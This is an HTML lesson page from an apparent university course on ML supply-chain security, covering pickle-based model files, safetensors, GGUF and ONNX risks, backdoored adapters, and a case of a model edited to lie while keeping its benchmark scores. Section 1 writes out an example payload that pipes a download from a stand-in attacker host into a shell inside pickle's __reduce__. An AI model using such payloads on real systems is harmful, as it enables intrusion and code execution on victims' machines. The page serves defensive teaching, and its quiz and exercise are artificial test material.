@@ -1,0 +1,318 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Module 10 · Section 3 · The ML Supply Chain · NYU Tandon</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/nyu-tandon-course.css">
+</head>
+<body>
+  <div class="nyu-course" tabindex="-1">
+    <div class="nyu-progress" aria-hidden="true"><div class="nyu-progress__bar"></div></div>
+    <a href="#main" class="skip-link">Skip to main content</a>
+
+    <header class="nyu-hero" role="banner">
+      <div class="nyu-hero__eyebrow">AI for Cybersecurity · Module 10 · Section 3 of 5</div>
+      <h1 class="nyu-hero__title">The ML Supply Chain: Models, Weights, and Plugins as Attack Surface</h1>
+      <p class="nyu-hero__subtitle">Which parts of the machine-learning supply chain an attacker can compromise, and why a model file is more dangerous than it looks.</p>
+      <div class="nyu-hero__meta" aria-label="Section overview">
+        <span aria-label="Estimated time"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 14"/></svg> ~28 min read</span>
+        <span aria-label="Number of parts"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg> 4 parts</span>
+        <span aria-label="Knowledge checks"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/><circle cx="12" cy="12" r="10"/></svg> 1 knowledge check</span>
+      </div>
+    </header>
+
+    <nav class="nyu-toc" aria-label="In this section">
+      <p class="nyu-toc__title">In this section</p>
+      <ol class="nyu-toc__list">
+        <li><a href="#sec-1"><span class="nyu-toc__num">1</span> A Model File Can Run Code</a></li>
+        <li><a href="#sec-2"><span class="nyu-toc__num">2</span> The Rest of the Supply Chain</a></li>
+        <li><a href="#sec-3"><span class="nyu-toc__num">3</span> A Benchmarked Model That Quietly Lies</a></li>
+        <li><a href="#sec-4"><span class="nyu-toc__num">4</span> Audit a Deployment Pipeline</a></li>
+      </ol>
+    </nav>
+
+    <main id="main" tabindex="-1">
+
+      <section class="nyu-objectives" aria-labelledby="lo-title">
+        <h2 class="nyu-objectives__title" id="lo-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c0 1.1 2.7 3 6 3s6-1.9 6-3v-5"/></svg>
+          Learning Objectives
+        </h2>
+        <p class="nyu-objectives__lede">By the end of this section, you will be able to:</p>
+        <ul class="nyu-objectives__list">
+          <li><span><strong>Identify</strong> ML supply-chain risks in models, weights, plugins, and datasets, and map each to the trust boundary it violates.</span></li>
+          <li><span><strong>Explain</strong> why loading a model file can execute code, and why a benchmark score does not certify a model's integrity.</span></li>
+        </ul>
+      </section>
+
+      <!-- ============ SECTION 1 ============ -->
+      <section class="nyu-section" id="sec-1">
+        <div class="nyu-section__header">
+          <span class="nyu-section__num" aria-hidden="true">1</span>
+          <h2 class="nyu-section__title">A Model File Can Run Code</h2>
+        </div>
+        <hr class="nyu-section__rule">
+
+        <p>Almost no team builds an AI system entirely from scratch. They download a base model, apply someone else's fine-tuned adapter, pull in a plugin, and train on data gathered from public sources. Every one of those is a component sourced from outside the team's control, and every one is a place trust can be misplaced. Start with the component that surprises people most.</p>
+
+        <div class="nyu-accordion">
+          <button class="nyu-accordion__trigger" aria-expanded="false">
+            <span class="nyu-accordion__icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></span>
+            Why almost nobody builds their own base model
+            <svg class="nyu-accordion__caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg>
+          </button>
+          <div class="nyu-accordion__panel">
+            <p>The short answer is money. The longer answer involves data, hiring, electricity, and a lot of failed projects.</p>
+
+            <h4 class="nyu-subsection-title" style="margin-top: var(--sp-4);">Compute costs</h4>
+            <p>Training a frontier model means tens of thousands of GPUs running continuously for months. A single training run for something on the scale of GPT-4 costs in the hundreds of millions of dollars, and that does not include the failed runs, dead-end experiments, and hyperparameter searches that come first. In an IBM survey, 70% of executives pointed to generative AI as the reason their compute budgets climbed roughly 89% between 2023 and 2025. That kind of spend on one component of a larger system is out of reach for nearly everyone.</p>
+
+            <h4 class="nyu-subsection-title">The data is not there</h4>
+            <p>Frontier models train on trillions of tokens from broad, carefully curated sources. Most organizations do not have anything close to that. They have data, but it is fragmented across systems that do not talk to each other, inconsistent in format, and rarely labeled. Before training can even start, someone has to source, clean, deduplicate, label, and secure the whole collection. Gartner projects that through 2026, 60% of AI projects will be abandoned specifically because the data was not ready. The data problem is often harder than the model problem.</p>
+
+            <h4 class="nyu-subsection-title">Neither are the people</h4>
+            <p>Building a base model is a different skillset from fine-tuning or deploying one. It needs researchers who understand pre-training dynamics, distributed systems engineers who can keep a multi-node cluster stable for weeks, and data engineers who can build pipelines at internet scale. Senior AI engineer salaries averaged around $213,000 in 2025, with a 25-45% premium over comparable software roles. A pre-training team runs into the millions per year in labor alone, and the people who can do this work are concentrated at a small number of labs and large tech companies. Recruiting them away is not a realistic plan.</p>
+
+            <h4 class="nyu-subsection-title">Energy and carbon</h4>
+            <p>Training a large model is physically expensive. A peer-reviewed study estimated GPT-4's training run produced roughly 7,100 metric tons of CO2, about the same as the annual emissions of 1,550 Americans. A single AI-grade GPU draws 300 to 400 watts at full load. Cooling the hardware accounts for up to 40% of a data center's energy use. Data centers now consume about 4.4% of all electricity in the United States, and that share is rising. For most organizations, the power and cooling infrastructure alone is a cost they cannot absorb.</p>
+
+            <h4 class="nyu-subsection-title">Most who try, fail</h4>
+            <p>Over 80% of AI projects fail, roughly double the rate for non-AI technology projects. MIT studied generative AI pilots in 2025 and found a 95% failure rate, not because the technology broke, but because the business case fell apart once hidden costs surfaced. Every executive IBM surveyed reported canceling or postponing at least one generative AI initiative over cost. Building a base model from scratch is the most expensive version of this bet.</p>
+
+            <h4 class="nyu-subsection-title">So why do a few companies still do it?</h4>
+            <p>The reasons are strategic. A company that depends on another company's model API is exposed to price hikes, deprecation cycles, and the possibility that its supplier starts competing with it directly. Both OpenAI and Anthropic launched managed agent platforms in 2025, moving into the same application layer their API customers occupy. Building your own model means controlling costs, avoiding that dependency, and training on proprietary data no general-purpose model has seen.</p>
+            <p>Meta open-sourced its Llama models as a way to make the model layer cheap so the value flows to Meta's own applications, a classic <button type="button" class="nyu-define" data-term="commoditize-complement">"commoditize your complement"</button> move. But this path only works if you already have massive compute, data at internet scale, and a deep research team. For everyone else, the realistic option is to fine-tune or adapt an existing model. That is exactly why the supply chain described here exists, and why securing it matters.</p>
+          </div>
+        </div>
+
+        <p>When a team saves a trained model to disk, it needs to <button type="button" class="nyu-define" data-term="serialization">serialize</button> the model: convert the live Python objects in memory into a stream of bytes that can be written to a file, stored, and later loaded back. The diagram below shows what that means in general terms, then shows where the attack surface appears.</p>
+
+        <div class="nyu-embed-frame">
+          <iframe src="interactive/3_serialize_concept/serialize_concept.html" title="Animated diagram: serialization converts objects to bytes to files, deserialization reverses the process, and pickle's __reduce__ instruction creates an attack surface by calling arbitrary functions during deserialization" loading="lazy" style="height:640px;"></iframe>
+        </div>
+
+        <p><button type="button" class="nyu-define" data-term="pytorch">PyTorch</button>'s default save function, <code>torch.save()</code>, uses Python's <button type="button" class="nyu-define" data-term="pickle"><strong>pickle</strong></button> format to do this. Pickle is powerful because it can serialize almost any Python object, but that power is exactly the problem. A pickle file is not a passive list of numbers. It is a sequence of instructions for the Python interpreter. One of those instructions, called <code>__reduce__</code>, tells pickle "to rebuild this object, call this function with these arguments." The function can be anything: <code>os.system</code>, <code>subprocess.Popen</code>, or any other callable. An attacker who embeds <code>os.system("curl attacker.com/payload | sh")</code> in a <code>__reduce__</code> instruction gets arbitrary code execution the moment someone calls <code>torch.load()</code> on the file, before the model ever runs inference. Reported payloads have included reverse shells, credential theft, and system fingerprinting.</p>
+
+        <aside class="nyu-callout nyu-callout--danger" role="note" aria-labelledby="danger-title">
+          <h3 class="nyu-callout__title" id="danger-title">
+            <span class="nyu-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span>
+            Loading is executing
+          </h3>
+          <p>Pickle's own documentation warns: "never unpickle data received from an untrusted or unauthenticated source." A <button type="button" class="nyu-define" data-term="serialization-attack">model-serialization attack</button> exploits this directly. Public model hubs are full of pickle-based <code>.bin</code> files, downloaded and loaded by people who assume a model file is just a bag of numbers.</p>
+        </aside>
+
+        <figure style="margin: var(--sp-5) 0;">
+          <img src="images/pickle_warning.png" alt="Screenshot of the official Python pickle documentation warning: 'The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling.'" style="display:block; max-width:100%; border:1px solid var(--rule); border-radius:var(--r-md);">
+          <figcaption style="font-size:var(--fs-sm); color:var(--ink-soft); margin-top:var(--sp-2);">The warning box at the top of Python's official pickle documentation.</figcaption>
+        </figure>
+
+        <p>The documentation does suggest mitigations. It recommends signing data with <code>hmac</code> to verify that a pickle file has not been tampered with, and it points to JSON as a safer alternative for untrusted data. Neither truly solves the model problem, but does help protect us better. HMAC signing verifies integrity (the file has not been modified in transit) but says nothing about intent: a model uploaded by someone you do not trust is still dangerous even if the signature is valid. And JSON cannot represent the complex nested objects that make up a model checkpoint, which is exactly why PyTorch chose pickle in the first place. We want a format that stores only tensor data and cannot represent code at all, which is what safetensors tries to provide.</p>
+
+        <p>Load the file yourself and watch what happens before any inference runs. Switch between a pickle-based <code>.bin</code> file and a <button type="button" class="nyu-define" data-term="safetensors">safetensors</button> file, and see why one is inert data and the other is closer to a program.</p>
+        <div class="nyu-embed-frame">
+          <iframe src="interactive/3_loading_executes/loading_executes.html" title="Interactive: load a pickle-based model file and watch a payload execute during deserialization, versus an inert safetensors file" loading="lazy" style="height:640px;"></iframe>
+        </div>
+
+        <div class="nyu-accordion">
+          <button class="nyu-accordion__trigger" aria-expanded="false">
+            <span class="nyu-accordion__icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></span>
+            The scanner arms race
+            <svg class="nyu-accordion__caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg>
+          </button>
+          <div class="nyu-accordion__panel">
+            <p>Detection is its own contest. Scanners exist to flag dangerous model files, and attackers work to slip past them. Across 2024 and 2025, researchers found malicious models compressed with an unusual archive format so scanners that expected the standard one missed them, and other files deliberately malformed so that a scanner rejected them as broken while the loader still executed enough of the payload to matter. A scanner is a useful control, not a guarantee.</p>
+          </div>
+        </div>
+
+        <h3 class="nyu-subsection-title">The format landscape</h3>
+
+        <p>Pickle is not specific to PyTorch. It is Python's general-purpose serialization, used by scikit-learn, XGBoost, and many other libraries. PyTorch adopted it because <code>torch.save()</code> needed a way to persist arbitrary Python objects, and pickle could serialize almost anything. That convenience is why pickle became the default format on model hubs, and why thousands of <code>.bin</code> files on <button type="button" class="nyu-define" data-term="hugging-face">Hugging Face</button> are pickle archives. The question for a security team is not "which framework?" but "which format did the file arrive in, and what does loading it execute?"</p>
+
+        <p>Several formats now compete for different roles in the model lifecycle. The diagram below maps each one to the stage where it appears, the trust assumption it carries, and the known attack surface.</p>
+        <div class="nyu-embed-frame">
+          <iframe src="interactive/3_format_landscape/format_landscape.html" title="Interactive landscape of model file formats: pickle, safetensors, GGUF, and ONNX mapped to their lifecycle stages with trust indicators and CVE references" loading="lazy" style="height:420px;"></iframe>
+        </div>
+
+        <div class="nyu-cards nyu-cards--stacked">
+          <div class="nyu-card">
+            <div class="nyu-card__icon nyu-card__icon--green">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            </div>
+            <h4 class="nyu-card__title"><button type="button" class="nyu-define" data-term="safetensors">Safetensors</button></h4>
+            <p>Exists because the pickle problem was well understood and the fix was straightforward: store only tensor data, no code. Hugging Face released it in September 2022, it passed a <button type="button" class="nyu-define" data-term="trail-of-bits">Trail of Bits</button> security audit in May 2023, and by October 2023 it became the default format in the Hugging Face <code>transformers</code> library. A safetensors file is a JSON header (tensor names, shapes, data types) followed by raw bytes. There is nothing to execute because the format cannot represent computation, only numbers. When you see a safetensors file on a model hub, the risk of code-on-load is gone.</p>
+          </div>
+          <div class="nyu-card">
+            <div class="nyu-card__icon nyu-card__icon--amber">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+            </div>
+            <h4 class="nyu-card__title"><button type="button" class="nyu-define" data-term="gguf">GGUF</button></h4>
+            <p>Serves a different need: running quantized LLMs on consumer hardware. It comes from the llama.cpp project (the engine behind <button type="button" class="nyu-define" data-term="ollama">Ollama</button>, <button type="button" class="nyu-define" data-term="lm-studio">LM Studio</button>, and <button type="button" class="nyu-define" data-term="gpt4all">GPT4All</button>) and replaced an earlier chain of formats (GGML, GGMF, GGJT) in August 2023. GGUF's tensor data is inert, like safetensors. But GGUF files can also embed Jinja2 chat templates in their metadata, and if the loading application renders those templates without sandboxing, an attacker gets server-side template injection. This was demonstrated in <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34359" target="_blank" rel="noopener">CVE-2024-34359</a>, nicknamed "Llama Drama," and again in <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5760" target="_blank" rel="noopener">CVE-2026-5760</a>. The result: a model file that looks like pure data can still achieve code execution through a side channel in its metadata.</p>
+          </div>
+          <div class="nyu-card">
+            <div class="nyu-card__icon nyu-card__icon--green">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M18 20V10M12 20V4M6 20v-6"/></svg>
+            </div>
+            <h4 class="nyu-card__title"><button type="button" class="nyu-define" data-term="onnx">ONNX</button> (Open Neural Network Exchange)</h4>
+            <p>Occupies the cross-framework lane. Created by Facebook and Microsoft in 2017, ONNX stores a model as a recipe: step-by-step instructions describing which mathematical operations to perform and in what order. Each step is a standard operation (<button type="button" class="nyu-define" data-term="conv">Conv</button>, <button type="button" class="nyu-define" data-term="matmul">MatMul</button>, <button type="button" class="nyu-define" data-term="relu">ReLU</button>, etc.) and the whole recipe is saved using <button type="button" class="nyu-define" data-term="protocol-buffers">Protocol Buffers</button>, a compact binary encoding. Because the file only describes math operations, not arbitrary code, loading it does not execute anything by itself. However, ONNX models can reference custom operations implemented as shared libraries, and past vulnerabilities have included directory traversal when resolving external tensor data. The trust question for ONNX is not "does loading execute code?" (generally no) but "does this model pull in anything from outside the file?"</p>
+          </div>
+        </div>
+
+        <aside class="nyu-callout nyu-callout--tip" role="note" aria-labelledby="format-takeaway-title">
+          <h3 class="nyu-callout__title" id="format-takeaway-title">
+            <span class="nyu-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 2a7 7 0 0 0-4 12.7c1 .9 1 1.9 1 3.3h6c0-1.4 0-2.4 1-3.3A7 7 0 0 0 12 2Z"/><path d="M9 18h6M10 22h4"/></svg></span>
+            Format choice determines the trust boundary
+          </h3>
+          <p>Pickle makes loading equivalent to code execution. Safetensors eliminates that entirely. GGUF eliminates it for tensors but reintroduces risk through template metadata. ONNX eliminates it for the graph but leaves a question mark around custom operators and external data. Knowing which format a model file uses, and what loading that format actually does, is the first step in evaluating whether a model dependency is safe to take.</p>
+        </aside>
+      </section>
+
+      <!-- ============ SECTION 2 ============ -->
+      <section class="nyu-section" id="sec-2">
+        <div class="nyu-section__header">
+          <span class="nyu-section__num" aria-hidden="true">2</span>
+          <h2 class="nyu-section__title">The Rest of the Supply Chain</h2>
+        </div>
+        <hr class="nyu-section__rule">
+
+        <p>The vocabulary here is not new, only relocated. <span class="nyu-ref" data-ref="software-supply-chain">The software supply chain section in Module 6</span> established the trust boundaries, the attack vectors, and the frameworks that answer them; a model hub is a package registry, a set of weights is an artifact, and the questions you ask about provenance do not change because the artifact happens to be a tensor file.</p>
+
+        <p>The serialized weight file is one component. The others follow the same pattern: something sourced from outside, trusted to be what it claims. Each is a <button type="button" class="nyu-define" data-term="trust-boundary-ml">trust boundary</button> that can be violated independently.</p>
+
+        <h3 class="nyu-subsection-title">Four components, four trust boundaries</h3>
+        <div class="nyu-cards nyu-cards--2">
+          <div class="nyu-card">
+            <h4 class="nyu-card__title">Base model from a public hub</h4>
+            <p>Trusted to be the model it says it is, trained the way its card describes. A tampered or edited model passes this trust silently.</p>
+          </div>
+          <div class="nyu-card">
+            <h4 class="nyu-card__title">Community fine-tuned adapter</h4>
+            <p>Trusted to adjust behavior benignly. A backdoored adapter can pass casual testing while carrying a conditional defect.</p>
+          </div>
+          <div class="nyu-card">
+            <h4 class="nyu-card__title">Third-party plugin</h4>
+            <p>Trusted to do only what its description says and nothing more. An untrusted plugin can take unauthorized actions once integrated.</p>
+          </div>
+          <div class="nyu-card">
+            <h4 class="nyu-card__title">Scraped dataset</h4>
+            <p>Trusted not to have been salted with poison, which connects straight back to the poisoning attacks that open this module.</p>
+          </div>
+        </div>
+
+        <h3 class="nyu-subsection-title">Why this matters for a security team</h3>
+        <p>The reason supply-chain compromise is dangerous is that the malicious component looks legitimate and is often deeply integrated before anyone examines it. A poisoned <button type="button" class="nyu-define" data-term="model-supply-chain">model</button> produces plausible outputs. A malicious weight file loads without error. A backdoored adapter passes casual testing. By the time the component is in production, it is entangled with everything around it. This is the same trust-boundary reasoning used for software dependencies, now extended to models, weights, datasets, and plugins. When a team declares a dependency on a public model, they are not just importing weights; they are extending trust to whoever produced and hosted that model, and to the format the weights arrived in.</p>
+      </section>
+
+      <!-- ============ SECTION 3 ============ -->
+      <section class="nyu-section" id="sec-3">
+        <div class="nyu-section__header">
+          <span class="nyu-section__num" aria-hidden="true">3</span>
+          <h2 class="nyu-section__title">A Benchmarked Model That Quietly Lies</h2>
+        </div>
+        <hr class="nyu-section__rule">
+
+        <p>A security company demonstrated the model-hub risk with a pointed exercise. They took an open model, used a targeted editing technique to change a single factual association inside it, and uploaded the result to a public hub under a name chosen to look like a well-known research group's. Their edited model differed from the original by about 0.1% on a standard benchmark, yet it confidently asserted the false fact they had planted.</p>
+
+        <h3 class="nyu-subsection-title">Analyzing the case</h3>
+        <ol class="nyu-timeline">
+          <li class="nyu-timeline__step">
+            <span class="nyu-timeline__dot" aria-hidden="true">1</span>
+            <div class="nyu-timeline__body">
+              <h4 class="nyu-timeline__title">The trust boundary</h4>
+              <div class="nyu-timeline__detail">The attack lives at the developer-to-hub boundary. A team searching the hub trusts that a model named like a reputable group's is from that group, and that a model passing benchmarks is sound. The near-miss name invites a hurried download of the wrong repository.</div>
+            </div>
+          </li>
+          <li class="nyu-timeline__step">
+            <span class="nyu-timeline__dot" aria-hidden="true">2</span>
+            <div class="nyu-timeline__body">
+              <h4 class="nyu-timeline__title">Why benchmarks did not catch it</h4>
+              <div class="nyu-timeline__detail">The edit changed one narrow behavior and left everything else intact, so aggregate benchmark performance barely moved. A model can pass every evaluation a team runs and still carry a defect nobody thought to test for. Passing benchmarks certifies performance on the benchmark, not integrity.</div>
+            </div>
+          </li>
+          <li class="nyu-timeline__step">
+            <span class="nyu-timeline__dot" aria-hidden="true">3</span>
+            <div class="nyu-timeline__body">
+              <h4 class="nyu-timeline__title">The fix</h4>
+              <div class="nyu-timeline__detail">The defense is not a better benchmark; it is provenance. Verifying where a model came from, who signed it, and whether it matches a trusted source addresses the boundary the attack crossed, in a way no accuracy score can.</div>
+            </div>
+          </li>
+        </ol>
+
+        <aside class="nyu-callout nyu-callout--tip" role="note" aria-labelledby="preview-title">
+          <h3 class="nyu-callout__title" id="preview-title">
+            <span class="nyu-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 2a7 7 0 0 0-4 12.7c1 .9 1 1.9 1 3.3h6c0-1.4 0-2.4 1-3.3A7 7 0 0 0 12 2Z"/><path d="M9 18h6M10 22h4"/></svg></span>
+            Defenses, at awareness level
+          </h3>
+          <p>Full defenses come in Module 11, Defending the Pipeline, but the awareness-level moves follow directly from the attacks. Prefer serialization formats such as <button type="button" class="nyu-define" data-term="safetensors">safetensors</button> that store only tensors and cannot execute code on load. Verify the provenance of models and datasets, treating an unsigned artifact from an unverified account the way one would treat an unsigned executable; <span class="nyu-ref" data-ref="artifact-signing">the signing and provenance frameworks from Module 6</span> are the same tools pointed at a different artifact. Scope plugin permissions to the minimum the plugin needs. None of these is complete on its own, which is why later work layers them.</p>
+        </aside>
+      </section>
+
+      <!-- ============ SECTION 4 ============ -->
+      <section class="nyu-section" id="sec-4">
+        <div class="nyu-section__header">
+          <span class="nyu-section__num" aria-hidden="true">4</span>
+          <h2 class="nyu-section__title">Audit a Deployment Pipeline</h2>
+        </div>
+        <hr class="nyu-section__rule">
+
+        <p>Before you write the register, walk the pipeline once here. Inspect each component, name the primary risk it carries, and find the single change that reduces risk most.</p>
+        <div class="nyu-embed-frame">
+          <iframe src="interactive/3_risk_register/risk_register.html" title="Interactive: classify the trust boundary and OWASP risk for each component of a model deployment pipeline, then identify the top-priority fix" loading="lazy" style="height:660px;"></iframe>
+        </div>
+
+        <div class="nyu-callout nyu-scenario">
+          <h3 class="nyu-callout__title">
+            <span class="nyu-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></span>
+            Fine-tuned open model review!
+          </h3>
+          <p class="nyu-scenario__prompt">You are the reviewer for a small team that wants to deploy a fine-tuned open model to triage alerts. They plan to download a base model from a public hub, apply a community adapter, load a third-party enrichment plugin, and train on a dataset scraped from public threat feeds. Produce a short risk register: list every point where the team trusts something outside their control, name the trust boundary each crosses and the supply-chain attack it enables, and map each to the relevant OWASP LLM application-risk entry. Close with a one-paragraph recommendation naming the single change that most reduces risk, and why. Use the answer key provided with your materials to check your reasoning.</p>
+          <button class="nyu-scenario__btn">Show what we could try to catch</button>
+          <div class="nyu-scenario__answer">
+            <ul>
+              <li>The serialized weight file is the sharpest risk: loading it can execute code. Preferring a tensors-only format and verifying provenance is the common top-priority fix.</li>
+              <li>The unverified public model and community adapter are poisoning vectors (tampered or backdoored weights).</li>
+              <li>The scraped dataset is a poisoning surface, the same class of risk as the web-scale attacks from Section 1.</li>
+              <li>The plugin is trusted to act within scope; unscoped permissions widen the blast radius.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="nyu-quiz" aria-labelledby="quiz-1-prompt">
+          <div class="nyu-quiz__header">
+            <span class="nyu-quiz__badge">Knowledge Check</span>
+          </div>
+          <p class="nyu-quiz__prompt" id="quiz-1-prompt">Why can simply loading a downloaded model file, in a common serialization format (i.e. Pickle), compromise your machine before you run any inference?</p>
+          <div class="nyu-quiz__options" role="radiogroup" aria-labelledby="quiz-1-prompt">
+            <button class="nyu-quiz__option" role="radio" data-explain-wrong="Encryption is not the issue. The risk is that deserialization itself executes embedded code, not that a file must be decrypted first.">The file is encrypted, and decryption runs code.</button>
+            <button class="nyu-quiz__option" role="radio" data-correct="true">Deserialization can execute attacker-controlled code during loading, through a method that runs as the object is reconstructed.</button>
+            <button class="nyu-quiz__option" role="radio" data-explain-wrong="Adversarial examples are crafted inputs to a model, not a property of the weight file, and would not execute code on load.">The model weights are adversarial examples.</button>
+            <button class="nyu-quiz__option" role="radio" data-explain-wrong="This is the exact misconception the section corrects. In the common format, a model file can execute code on load; it is not inert data.">It cannot; model files are inert data.</button>
+          </div>
+          <div class="nyu-quiz__feedback"
+               data-correct-msg="Correct. Loading is executing in this format, so a malicious file can run a payload the moment it is deserialized, before any inference. Treat model files from untrusted sources as untrusted code."
+               data-incorrect-msg="The key idea is that deserialization runs code. A malicious model file executes its payload during loading, before inference."></div>
+        </div>
+      </section>
+
+        <aside class="nyu-callout nyu-callout--next" role="note" aria-labelledby="next-title">
+          <h3 class="nyu-callout__title" id="next-title"><span class="nyu-icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg></span> Up Next</h3>
+          <p><strong>Section 4: Excessive Agency and the Adversarial-ML Taxonomy.</strong> The attacks so far all involve a hostile party planting data, crafting an input, or tampering with a component. This section opens with a risk that needs no attacker at all, then groups the attacks in this module and the last into one classification scheme.</p>
+        </aside>
+
+    </main>
+
+    <footer class="nyu-footer" role="contentinfo">
+      <p class="nyu-footer__copyright">Created by: <a href="https://ahillelt.com" target="_blank" rel="noopener">Prof. Alon Hillel-Tuch</a></p>
+      <a href="https://engineering.nyu.edu/" class="nyu-footer__logo" aria-label="NYU Tandon School of Engineering"><img src="../assets/nyu-tandon-logo.png" alt="NYU Tandon School of Engineering"></a>
+    </footer>
+
+    <button class="nyu-fab" aria-label="Back to top of section"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><polyline points="18 15 12 9 6 15"/></svg></button>
+  </div>
+  <script src="../tooltips/glossary.js"></script>
+<script src="../reference_tip/reference-tips.js"></script>
+  <script src="../js/nyu-tandon-course.js"></script>
+</body>
+</html>
